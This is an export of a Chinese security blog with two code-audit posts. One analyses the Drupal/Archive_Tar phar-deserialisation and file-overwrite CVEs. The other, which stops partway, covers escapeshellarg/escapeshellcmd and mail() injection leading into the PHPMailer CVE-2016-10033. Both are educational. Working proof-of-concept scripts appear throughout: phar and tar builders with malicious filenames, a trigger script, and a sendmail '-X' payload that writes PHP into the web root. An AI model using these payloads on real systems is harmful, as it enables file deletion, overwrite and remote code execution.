<p><a href="https://www.drupal.org/sa-core-2020-013">https://www.drupal.org/sa-core-2020-013</a></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201209143410.png" alt=""></p>
<p>通报中提到，Drupal使用了Archive_Tar第三方PEAR组件，而这个组件最近发布了一版安全更新，那么就先去官方仓库上看看Drupal是怎么修复这个漏洞的。以Drupal 8.9版本为例：</p>
<p><a href="https://git.drupalcode.org/project/drupal/-/commit/1a9383ed9010af01608a5481ad443eb72c1bea7e">https://git.drupalcode.org/project/drupal/-/commit/1a9383ed9010af01608a5481ad443eb72c1bea7e</a></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201209144007.png" alt=""></p>
<p>可以很明显的看到，Drupal将Archive_tar的版本从1.4.9升级到1.4.11。所以这个漏洞的源头并不是Drupal代码出了问题，而是第三方组件Archive_tar存在缺陷。那我们就主要分析一下Archive_tar的漏洞成因，同样的，去这个组件的GitHub仓库看两个版本的差异点。</p>
<p><a href="https://github.com/pear/Archive_Tar/compare/1.4.9...1.4.11">https://github.com/pear/Archive_Tar/compare/1.4.9...1.4.11</a></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201209144432.png" alt=""></p>
<p>左边是1.4.9版本的代码，右边是1.4.11版本的代码，漏洞的源头就是在于<code>_maliciousFilename</code>函数中。</p>
<p>作者为了防止反序列化漏洞，过滤了<code>phar://</code>关键字，但明显strpos这种简单的过滤还是太年轻了，可以很容易地用大写来绕过<code>PHAR://exploit.phar</code>，从而导致反序列化漏洞的产生，这就是CVE-2020-28948漏洞的根源。同样CVE-2020-28949漏洞的根源也在这个地方，我们可以使用<code>file://path/to/file/to/be/overwritten</code>协议作为文件名，从而导致文件覆盖的漏洞。</p>
<p>Archive_tar组件也很简单，就一个PHP文件，具体的漏洞成因我们审计这一个文件即可。</p>
<p>一共也就两个地方用到了<code>_maliciousfilename</code>这个函数，一个是<code>_readHeader</code>函数，另一个是<code>_readLongHeader</code>函数。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201209150851.png" alt=""></p>
<p>而从上图可以看到，在<code>_readLongHeader</code>函数中，还是调用了<code>_readHeader</code>函数，所以我们主要分析<code>_readHeader</code>这个函数。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201209152216.png" alt=""></p>
<p>这个函数比较长，但是通读下来，发现就做了一件事情，读取压缩文件的头部信息，这些信息包括<code>checksum</code>、<code>property</code>，其中<code>property</code>包含了<code>filename</code>、<code>mode</code>、<code>uid</code>、<code>gid</code>、<code>size</code>等等字段，将这些信息存储在<code>$v_header</code>中并返回到上一级函数，那么我们就进行回溯工作，看有哪些地方调用了<code>_readHeader</code>这个函数。</p>
<p>全局查找后，发现一共有三个地方，分别是<code>_readLongHeader</code>、<code>_extractList</code>和<code>_extractInString</code>，后两个函数对比一下就可以发现，<code>_extractList</code>是一个较为完整的解压缩过程，那从这里开始分析肯定是没错的。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201209153149.png" alt=""></p>
<p>在1989行调用了<code>readHeader</code>函数，在我们跟踪<code>$v_header['filename']</code>参数之前，由于函数传参较多，而且参数会很大程度上影响程序流程，所以我们调研一下Archive_tar组件使用方法后发现，解压缩主要是用到<code>extract</code>这个函数。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201210143209.png" alt=""></p>
<p>继续跟进<code>extractModify</code>函数</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201210143245.png" alt=""></p>
<p>在574行调用了<code>_extractList</code>函数，进入上述所说的实质性解压操作。</p>
<p>根据上图的参数，正常程序流程会进入到2049行的if语句中，并且不会进入到2050行和2062行的if语句中。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201210143940.png" alt=""></p>
<p>接下来在执行2075行的if语句时，调用了<code>file_exsits</code>函数，参数是原本<code>$v_header['filename']</code>的值，此时如果这个值是<code>PHAR://exploit.phar</code>，并且当前文件夹上传了expliot.phar文件，那么就会触发反序列化漏洞。</p>
<p>既然是反序列化操作，那么就需要全局搜索<code>__destruct</code>或者<code>__wakeup</code>函数。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201210144655.png" alt=""></p>
<p>全局搜索析构函数后，继续跟进<code>_close</code>函数</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201210144758.png" alt=""></p>
<p>在该函数的最后一部分，当<code>_temp_tarname</code>不为空的时候，会调用<code>unlink</code>删除文件函数，那么这个地方就可以触发任意文件删除的漏洞了。</p>
<p>分析完漏洞成因后，接下来就是编写漏洞利用的脚本了。首先新建一个<code>ca01h_test</code>的文件，内容随意，接下来编写生成Phar文件的PHP代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;phar.readonly&#x27;</span>,<span class="string">&#x27;Off&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Archive_Tar</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> $_temp_tarname;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$_temp_tarname</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;_temp_tarname = $_temp_tarname;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&#x27;exploit.phar&#x27;</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;addFromString(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;text&#x27;</span>);</span><br><span class="line">$phar-&gt;setStub(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>);</span><br><span class="line">$tar = <span class="keyword">new</span> Archive_Tar(<span class="string">&#x27;ca01h_test&#x27;</span>);</span><br><span class="line">$phar-&gt;setMetadata($tar);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>
<p>然后再编写python脚本生成一个压缩文件，其中被压缩的文件名是<code>PHAR://exploit.phar</code>，input_file.txt文件内容随意：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line">tar = tarfile.open(<span class="string">&#x27;exploit.tar&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">tar.add(<span class="string">&#x27;input_file.txt&#x27;</span>, <span class="string">&#x27;PHAR://exploit.phar&#x27;</span>)</span><br><span class="line">tar.close()</span><br></pre></td></tr></table></figure>
<p>最后编写触发漏洞的代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">require_once</span>(<span class="string">&#x27;../Archive/Tar.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  $archive = <span class="keyword">new</span> Archive_Tar(<span class="string">&#x27;exploit.tar&#x27;</span>);</span><br><span class="line">  $archive-&gt;extract();</span><br></pre></td></tr></table></figure>
<p>运行上面代码后，可以发现<code>ca01h_test</code>文件被删除。</p>
<p>接下来再讨论一下CVE-2020-28948，产生漏洞的原因同时是因为过滤不严，只是触发漏洞的位置不一样而言。<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201210152508.png" alt=""></p>
<p>程序在第2151行或2158行调用了<code>fwrite</code>函数，将从压缩文件读出来的文件内容写入到<code>$v_header[filename]</code>文件中，那么这个地方就可能造成任意文件覆盖的漏洞。流程如下：</p>
<p>首先生成一个测试文件，内容随意：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;test&quot;</span> &gt; /tmp/target_file</span><br></pre></td></tr></table></figure>
<p>再用python脚本生成带有恶意payload文件名的压缩文件：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line">tar = tarfile.open(<span class="string">&#x27;exploit.tar&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">tar.add(<span class="string">&#x27;input_file.txt&#x27;</span>, <span class="string">&#x27;file:///tmp/target_file&#x27;</span>)</span><br><span class="line">tar.close()</span><br></pre></td></tr></table></figure>
<p>最后执行同样的漏洞触发代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">require_once</span>(<span class="string">&#x27;../Archive/Tar.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  $archive = <span class="keyword">new</span> Archive_Tar(<span class="string">&#x27;exploit.tar&#x27;</span>);</span><br><span class="line">  $archive-&gt;extract();</span><br></pre></td></tr></table></figure>
<h2 id="参考">参考</h2>
<p><a href="https://github.com/vulhub/vulhub/tree/master/drupal">https://github.com/vulhub/vulhub/tree/master/drupal</a></p>
<p><a href="https://paper.seebug.org/334/">https://paper.seebug.org/334/</a></p>
<p><a href="http://blog.topsec.com.cn/%e5%85%b3%e4%ba%8edrupal8%e7%b3%bb%e5%88%97%e6%a1%86%e6%9e%b6%e5%92%8c%e6%bc%8f%e6%b4%9e%e5%8a%a8%e6%80%81%e8%b0%83%e8%af%95%e6%b7%b1%e5%85%a5%e5%88%86%e6%9e%90/">http://blog.topsec.com.cn/关于drupal8系列框架和漏洞动态调试深入分析/</a></p>
<p><a href="https://kylingit.com/blog/%E7%94%B1phpggc%E7%90%86%E8%A7%A3php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">https://kylingit.com/blog/由phpggc理解php反序列化漏洞/</a></p>
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP代码审计学习——Day5</title>
    <url>/code_audit/PHP/7.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day5/</url>
    <content><![CDATA[<h1 id="PHP代码审计学习Day5——escapeshellarg与escapeshellcmd使用不当">PHP代码审计学习Day5——escapeshellarg与escapeshellcmd使用不当</h1>
<h2 id="0x01-postcart">0x01 postcart</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mailer</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitize</span>(<span class="params">$email</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!filter_var($email, FILTER_VALIDATE_EMAIL)) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> escapeshellarg($email);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">send</span>(<span class="params">$data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($data[<span class="string">&#x27;to&#x27;</span>])) &#123;</span><br><span class="line">      $data[<span class="string">&#x27;to&#x27;</span>] = <span class="string">&#x27;none@ripstech.com&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      $data[<span class="string">&#x27;to&#x27;</span>] = <span class="keyword">$this</span>-&gt;sanitize($data[<span class="string">&#x27;to&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($data[<span class="string">&#x27;from&#x27;</span>])) &#123;</span><br><span class="line">      $data[<span class="string">&#x27;from&#x27;</span>] = <span class="string">&#x27;none@ripstech.com&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      $data[<span class="string">&#x27;from&#x27;</span>] = <span class="keyword">$this</span>-&gt;sanitize($data[<span class="string">&#x27;from&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($data[<span class="string">&#x27;subject&#x27;</span>])) &#123;</span><br><span class="line">      $data[<span class="string">&#x27;subject&#x27;</span>] = <span class="string">&#x27;No Subject&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($data[<span class="string">&#x27;message&#x27;</span>])) &#123;</span><br><span class="line">      $data[<span class="string">&#x27;message&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mail($data[<span class="string">&#x27;to&#x27;</span>], $data[<span class="string">&#x27;subject&#x27;</span>], $data[<span class="string">&#x27;message&#x27;</span>],</span><br><span class="line">      <span class="string">&#x27;&#x27;</span>, <span class="string">&quot;-f&quot;</span> . $data[<span class="string">&#x27;from&#x27;</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$mailer = <span class="keyword">new</span> Mailer();</span><br><span class="line">$mailer-&gt;send($_POST);</span><br></pre></td></tr></table></figure>
<p>这道题其实是考察由 php 内置函数 <strong>mail</strong> 所引发的命令执行漏洞。我们先看看 php 自带的 <strong>mail</strong> 函数的用法：</p>
<blockquote>
<p>mail ( string <code>$to</code> , string <code>$subject</code> , string <code>$message</code> [, <a href="https://www.php.net/manual/en/language.pseudo-types.php#language.types.mixed">mixed</a> <code>$additional_headers</code> [, string <code>$additional_parameters</code> ]] ) : bool</p>
<ul>
<li>to，指定邮件接收者，即接收人</li>
<li>subject，邮件的标题</li>
<li>message，邮件的正文内容</li>
<li>additional_headers，指定邮件发送时其他的额外头部，如发送者From，抄送CC，隐藏抄送BCC</li>
<li>additional_parameters，指定传递给发送程序sendmail的额外参数。</li>
</ul>
</blockquote>
<p>在Linux系统上，<code>send</code>函数默认调用 <strong>Linux</strong> 的 <strong><a href="http://www.sendmail.com/">sendmail</a></strong> 程序发送邮件。而在额外参数( <strong>additional_parameters</strong> )中， <strong>sendmail</strong> 主要支持的选项有以下三种：</p>
<blockquote>
<ul>
<li>
<p>-O option = value</p>
<p>QueueDirectory = queuedir 选择队列消息</p>
</li>
<li>
<p>-X logfile</p>
<p>这个参数可以指定一个目录来记录发送邮件时的详细日志情况。</p>
</li>
<li>
<p>-f from email</p>
<p>这个参数可以让我们指定我们发送邮件的邮箱地址。</p>
</li>
</ul>
</blockquote>
<h3 id="漏洞一">漏洞一</h3>
<p>写一个demo：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$to = <span class="string">&quot;Alice@example/com&quot;</span>;</span><br><span class="line">$from = <span class="string">&quot;Hello Alice&quot;</span>;</span><br><span class="line">$message = <span class="string">&quot;&lt;?php phpinfo(); ?&gt;&quot;</span>;</span><br><span class="line">$headers = <span class="string">&quot;CC: somebodyelse@example.com&quot;</span>;</span><br><span class="line">$options = <span class="string">&quot;-OQueueDirectory=/tmp -X /var/www/html/rce.php&quot;</span>;</span><br><span class="line">mail($to, $subject, $message, $header, $options);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>上面这个样例中，我们使用 <strong>-X</strong> 参数指定日志文件，最终会在 <strong>/var/www/html/rce.php</strong> 中写入如下数据：运行之后会生成一个<code>rce.php</code>的日志文件，查看其内容：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200616094030.png" alt=""></p>
<h3 id="漏洞二">漏洞二</h3>
<p>但是我们还可以在<code>$to</code>这个字段注入命令，关于这个字段一共有三层过滤。</p>
<h4 id="第一层：filter-var">第一层：filter_var</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">filter_var($email, FILTER_VALIDATE_EMAIL)</span><br></pre></td></tr></table></figure>
<p><img src="C:%5CUsers%5C51196%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200616094611224.png" alt="image-20200616094611224"></p>
<p>P牛的一篇文章也提到了怎么绕过<code>FILTER_VALIDATE_EMAIL</code>：<a href="https://www.leavesongs.com/PENETRATION/some-tricks-of-attacking-lnmp-web-application.html">https://www.leavesongs.com/PENETRATION/some-tricks-of-attacking-lnmp-web-application.html</a></p>
<p>这里就用几个demo演示一下方便理解：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$email1 = <span class="string">&#x27;12 3@test.com&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> $email1;</span><br><span class="line">var_dump(filter_var($email1, FILTER_VALIDATE_EMAIL)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">$email2 = <span class="string">&#x27;12\ 3@test.com&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> $email2;</span><br><span class="line">var_dump(filter_var($email2, FILTER_VALIDATE_EMAIL)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">$email3 = <span class="string">&#x27;&quot;12\ 3&quot;@test.com&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> $email3;</span><br><span class="line">var_dump(filter_var($email3, FILTER_VALIDATE_EMAIL)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">$email4 = <span class="string">&#x27;&quot;123\&quot;\&#x27;&quot;@test.com&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> $email4;</span><br><span class="line">var_dump(filter_var($email4, FILTER_VALIDATE_EMAIL)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">$email5 = <span class="string">&#x27;\&#x27;.&quot;123&quot;@test.com&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> $email5;</span><br><span class="line">var_dump(filter_var($email5, FILTER_VALIDATE_EMAIL)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">$email6 = <span class="string">&#x27;\&quot;.&quot;123&quot;@test.com&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> $email6;</span><br><span class="line">var_dump(filter_var($email6, FILTER_VALIDATE_EMAIL)).<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>测试结果如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">12 3@test.combool(false)</span><br><span class="line">12\ 3@test.combool(false)</span><br><span class="line">&quot;12\ 3&quot;@test.comstring(16) &quot;&quot;12\ 3&quot;@test.com&quot;</span><br><span class="line">&quot;123\&quot;&#39;&quot;@test.comstring(17) &quot;&quot;123\&quot;&#39;&quot;@test.com&quot;</span><br><span class="line">&#39;.&quot;123&quot;@test.comstring(16) &quot;&#39;.&quot;123&quot;@test.com&quot;</span><br><span class="line">\&quot;.&quot;123&quot;@test.combool(false)</span><br></pre></td></tr></table></figure>
<h4 id="第二层：escapeshellarg">第二层：escapeshellarg</h4>
<p>官方文档：</p>
<blockquote>
<p><strong>escapeshellarg</strong> —— 把字符串转码为可以在 shell 命令里使用的参数</p>
<p>功能 ：escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，shell 函数包含 exec()，system() 执行运算符(反引号)</p>
</blockquote>
<p>demo1：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">$b=escapeshellarg($a);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;old: &quot;</span>.$a.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;now: &quot;</span>.$b;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//old: 123  now: &#x27;123&#x27; 两边加上单引号</span></span><br></pre></td></tr></table></figure>
<p>demo2：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">&quot;12&#x27;3&quot;</span>;</span><br><span class="line">$b=escapeshellarg($a);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;old: &quot;</span>.$a.<span class="string">&quot;\t\t&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;now: &quot;</span>.$b;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//old: 12&#x27;3	 now: &#x27;12&#x27;\&#x27;&#x27;3&#x27; 单引号被转义，两边均加上单引号</span></span><br></pre></td></tr></table></figure>
<h4 id="第三层：escapeshellcmd">第三层：escapeshellcmd</h4>
<p>PHP的 <strong>mail()</strong> 函数在底层实现中，调用了 <strong>escapeshellcmd()</strong> 函数，官方文档：</p>
<blockquote>
<p><strong>escapeshellcmd()</strong> —— 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 <a href="https://www.php.net/manual/zh/function.exec.php">exec()</a> 或 <a href="https://www.php.net/manual/zh/function.system.php">system()</a> 函数，或者 <a href="https://www.php.net/manual/zh/language.operators.execution.php">执行操作符</a> 之前进行转义。</p>
<p>反斜线（\）会在以下字符之前插入： *&amp;#;`|*?~&lt;&gt;^()[]{}$*, <em>\x0A</em> 和 <em>\xFF</em>。 <em>’</em> 和 <em>&quot;</em> 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 <em>%</em> 和 <em>!</em> 字符都会被空格代替。</p>
</blockquote>
<p>demo1：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">&#x27;12&quot;3&#x27;</span>;</span><br><span class="line">$b=escapeshellcmd($a);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;old: &quot;</span>.$a.<span class="string">&quot;\t\t&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;now: &quot;</span>.$b;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">// old: 12&quot;3	 now: 12\&quot;3</span></span><br></pre></td></tr></table></figure>
<p>demo2：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">&#x27;12&quot;3&quot;&#x27;</span>;</span><br><span class="line">$b=escapeshellcmd($a);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;old: &quot;</span>.$a.<span class="string">&quot;\t\t&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;now: &quot;</span>.$b;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//old: 12&quot;3&quot;  now: 12&quot;3&quot; 注意 &#x27; 和 &quot; 仅在不配对儿的时候被转义</span></span><br></pre></td></tr></table></figure>
<p>那我们前面说过了PHP的 <strong>mail()</strong> 函数在底层调用了 <strong>escapeshellcmd()</strong> 函数对用户输入的邮箱地址进行处理，即使我们使用带有特殊字符的payload，绕过 <strong>filter_var()</strong> 的检测，但还是会被 <strong>escapeshellcmd()</strong> 处理。然而 <strong>escapeshellcmd()</strong> 和 <strong>escapeshellarg</strong> 一起使用，会造成特殊字符逃逸，下面通过一个<a href="https://paper.seebug.org/164/#_2">简单例子</a>理解一下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $param=<span class="string">&quot;127.0.0.1&#x27; -v -d a=1&quot;</span>;</span><br><span class="line">    $a=escapeshellarg($param);</span><br><span class="line">    $b=escapeshellcmd($a);</span><br><span class="line">    $cmd=<span class="string">&quot;curl &quot;</span>.$b;</span><br><span class="line">	var_dump($a).<span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">	var_dump($b).<span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">	var_dump($cmd).<span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">    system($cmd);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>详细分析一下这个过程：</p>
<ol>
<li>
<p>传入的参数是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1&#39; -v -d a&#x3D;1</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>由于<code>escapeshellarg</code>先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。所以处理之后的效果如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;127.0.0.1&#39;\&#39;&#39; -v -d a&#x3D;1&#39;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>接着 <code>escapeshellcmd</code> 函数对第二步处理后字符串中的 <code>\</code> 以及 <code>a=1'</code> 中的单引号进行转义处理，结果如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;127.0.0.1&#39;\\&#39;&#39; -v -d a&#x3D;1\&#39;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>由于第三步处理之后的payload中的 <code>\\</code> 被解释成了 <code>\</code> 而不再是转义字符，所以单引号配对连接之后将payload分割为三个部分，具体如下所示：</p>
</li>
</ol>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200616120152.png" alt=""></p>
<h2 id="0x02-实例分析">0x02 实例分析</h2>
<p>这里实例分析选择 <strong>PHPMailer 命令执行漏洞</strong> （ <strong>CVE-2016-10045</strong> 和 <strong>CVE-2016-10033</strong> ）。</p>
<h3 id="CVE-2016-10033">CVE-2016-10033</h3>
<p>又是P牛的文章：<a href="https://www.leavesongs.com/PENETRATION/PHPMailer-CVE-2016-10033.html">https://www.leavesongs.com/PENETRATION/PHPMailer-CVE-2016-10033.html</a></p>
<p>Seebug：<a href="https://paper.seebug.org/161/">https://paper.seebug.org/161/</a></p>
<h4 id="环境搭建">环境搭建</h4>
<p>Dockerfile：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> php:<span class="number">5.6</span>-apache</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> apt-get update &amp;&amp; apt-get install -y sendmail</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> <span class="built_in">echo</span> <span class="string">&#x27;sendmail_path = &quot;/usr/sbin/sendmail -t -i&quot;&#x27;</span> &gt; /usr/<span class="built_in">local</span>/etc/php/php.ini</span></span><br></pre></td></tr></table></figure>
<p>提前下载好源码，在源码根目录下添加测试文件 1.php：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">&#x27;PHPMailerAutoload.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line">$mail = <span class="keyword">new</span> PHPMailer;</span><br><span class="line">$mail-&gt;setFrom($_GET[<span class="string">&#x27;x&#x27;</span>], <span class="string">&#x27;Vuln Server&#x27;</span>);</span><br><span class="line">$mail-&gt;Subject = <span class="string">&#x27;subject&#x27;</span>;</span><br><span class="line">$mail-&gt;addAddress(<span class="string">&#x27;c@d.com&#x27;</span>, <span class="string">&#x27;attacker&#x27;</span>);</span><br><span class="line">$mail-&gt;msgHTML(<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">$mail-&gt;AltBody = <span class="string">&#x27;Body&#x27;</span>;</span><br><span class="line"></span><br><span class="line">$mail-&gt;send();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>shell：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker build -t cve-2016-10033 .</span><br><span class="line">docker run --rm --name vuln-phpmail -p 8080:80  -v &#x2F;home&#x2F;ca01h&#x2F;phpmail&#x2F;deploy&#x2F;PHPMailer-5.2.17:&#x2F;var&#x2F;www&#x2F;html cve-2016-10033</span><br></pre></td></tr></table></figure>
<h4 id="漏洞原理">漏洞原理</h4>
<p>漏洞具体位置在 <strong>class.phpmailer.php</strong> 中：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">mailPassthru</span>(<span class="params">$to, $subject, $body, $header, $params</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Can&#x27;t use additional_parameters in safe_mode</span></span><br><span class="line">        <span class="comment">//@link http://php.net/manual/en/function.mail.php</span></span><br><span class="line">        <span class="keyword">if</span> (ini_get(<span class="string">&#x27;safe_mode&#x27;</span>) <span class="keyword">or</span> !<span class="keyword">$this</span>-&gt;UseSendmailOptions <span class="keyword">or</span> is_null($params)) &#123;</span><br><span class="line">            $result = @mail($to, $subject, $body, $header);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $result = @mail($to, $subject, $body, $header, $params);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
